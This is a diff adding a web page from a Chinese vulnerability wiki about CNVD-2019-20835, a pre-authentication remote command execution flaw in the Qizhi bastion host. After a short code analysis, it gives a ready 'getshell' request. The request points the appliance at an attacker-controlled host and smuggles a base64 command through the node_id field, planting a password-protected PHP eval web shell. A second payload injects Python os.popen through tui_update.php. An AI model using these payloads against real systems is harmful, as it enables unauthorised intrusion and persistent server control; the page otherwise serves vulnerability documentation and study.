@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%EF%BC%88CNVD-2019-20835%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>（CNVD-2019-20835）齐治堡垒机 前台远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\uff08CNVD-2019-20835\uff09\u9f50\u6cbb\u5821\u5792\u673a \u524d\u53f0\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+          {title: "Node_request\u51fd\u6570\u7684\u5b9a\u4e49\u5728include/common.php\u6587\u4ef6\u4e2d\uff0c\u89c1\u4e0b\u56fe2\u3002\u6309\u7167\u5176\u539f\u672c\u7684\u903b\u8f91\uff0c\u5176\u4f5c\u7528\u662f\u8bf7\u6c42$url\uff0c\u5e76\u8fd4\u56de\u5176\u5185\u5bb9\u3002\u6839\u636e\u4ee3\u7801\u903b\u8f91\uff0c$url", url: "#node_requestincludecommonphp2urlurl", children: [
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_5" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E9%BE%99%E8%85%BE%E7%A0%81%E6%94%AF%E4%BB%98/%E9%BE%99%E8%85%BE%E7%A0%81%E6%94%AF%E4%BB%98payservicecurl%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E9%BE%99%E8%85%BE%E7%A0%81%E6%94%AF%E4%BB%98/%E9%BE%99%E8%85%BE%E7%A0%81%E6%94%AF%E4%BB%98payservicecurl%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        龙腾码支付payservicecurl任意文件读取
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%EF%BC%88CNVD-2019-17294%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%EF%BC%88CNVD-2019-17294%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CNVD-2019-17294）齐治堡垒机 后台命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="cnvd-2019-20835">（CNVD-2019-20835）齐治堡垒机 前台远程命令执行漏洞<a class="headerlink" href="#cnvd-2019-20835" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>利用条件：无需登录</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>问题出现在ha_request.php文件，第37行的exec函数，$url为用户可控的变量，可见第33和34行。目光来到第23和24行，只要node_request函数的返回值为"OK"，即可跳过fatal函数（此函数为自定义函数，作用类似PHP内置的exit函数），继续往下执行。</p>
+<h1 id="node_requestincludecommonphp2urlurl">Node_request函数的定义在include/common.php文件中，见下图2。按照其原本的逻辑，其作用是请求$url，并返回其内容。根据代码逻辑，$url<a class="headerlink" href="#node_requestincludecommonphp2urlurl" title="Permanent link">&para;</a></h1>
+<p>\"http://$req_ipaddr\".\"/listener/$method.php?n=$req_node_id&amp;a=\".urlencode(json_encode($args));。所以$url变量值类似于</p>
+<p><a href="http://10.20.10.11/listener/cluster_manage.php?n=1&amp;a=%5B%22install%22%5D">http://10.20.10.11/listener/cluster_manage.php?n=1&amp;a=%5B%22install%22%5D</a>这样的字符串。</p>
+<p>但是$req_ipaddr和$req_node_id均来自用户输入。因此，假设10.20.10.11为黑客可控的服务器，listener/cluster_manage.php文件的内容为"\&lt;?php
+echo
+'OK';&gt;"，即可使得node_request函数返回"OK"，从而跳过fatal函数，继续往下执行来到exec函数。</p>
+<p>回到exec函数，此时该函数的第一个参数是这样的，\"wget
+--no-check-certificate <a href="http://10.20.10.11">http://10.20.10.11</a>
+/ha_get_install.php?n=$req_node_id -O
+backup_scripts.tar.bz2\"，所以我们的payload只能放在$req_node_id变量中。</p>
+<p>见下图，$req_ipaddr和$req_node_id其实来自于$_REQUEST['ipaddr']和$_REQUEST[node_id']，并做了全局过滤，删除掉一些危险字符。<img alt="1.png" src="../resource/%28CNVD-2019-20835%29%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" /><img alt="2.png" src="../resource/%28CNVD-2019-20835%29%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png" /><img alt="3.png" src="../resource/%28CNVD-2019-20835%29%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>访问**<a href="http://www.0-sec.org/listener/cluster">http://www.0-sec.org/listener/cluster</a>_manage.php**返回"OK"。</p>
+<p>执行以下链接即可getshell，执行成功后，生成PHP一句话马/var/www/shterm/resources/qrcode/lbj77.php
+密码10086</p>
+<div class="codehilite"><pre><span></span><code>https://www.0-sec.org/ha_request.php?action=install<span class="err">&amp;</span>ipaddr=www.0-sec.org<span class="err">&amp;</span>node_id=1<span class="cp">${</span><span class="n">IFS</span><span class="cp">}</span>|`echo<span class="cp">${</span><span class="n">IFS</span><span class="cp">}</span>&quot;ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK&quot;|base64<span class="cp">${</span><span class="n">IFS</span><span class="cp">}</span>-d|bash`|<span class="cp">${</span><span class="n">IFS</span><span class="cp">}</span>|echo<span class="cp">${</span><span class="n">IFS</span><span class="cp">}</span>
+</code></pre></div>
+
+<p>据说还有另外一个版本是java的:</p>
+<div class="highlight"><pre><span></span><code>POST /shterm/listener/tui_update.php
+
+a=[&quot;t&#39;;import os;os.popen(&#39;whoami&#39;)#&quot;]
+</code></pre></div>
+<h2 id="_6">参考链接<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://www.cnblogs.com/StudyCat/p/11256944.html">https://www.cnblogs.com/StudyCat/p/11256944.html</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E9%BE%99%E8%85%BE%E7%A0%81%E6%94%AF%E4%BB%98/%E9%BE%99%E8%85%BE%E7%A0%81%E6%94%AF%E4%BB%98payservicecurl%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E9%BE%99%E8%85%BE%E7%A0%81%E6%94%AF%E4%BB%98/%E9%BE%99%E8%85%BE%E7%A0%81%E6%94%AF%E4%BB%98payservicecurl%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        龙腾码支付payservicecurl任意文件读取
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%EF%BC%88CNVD-2019-17294%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%EF%BC%88CNVD-2019-17294%EF%BC%89%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CNVD-2019-17294）齐治堡垒机 后台命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
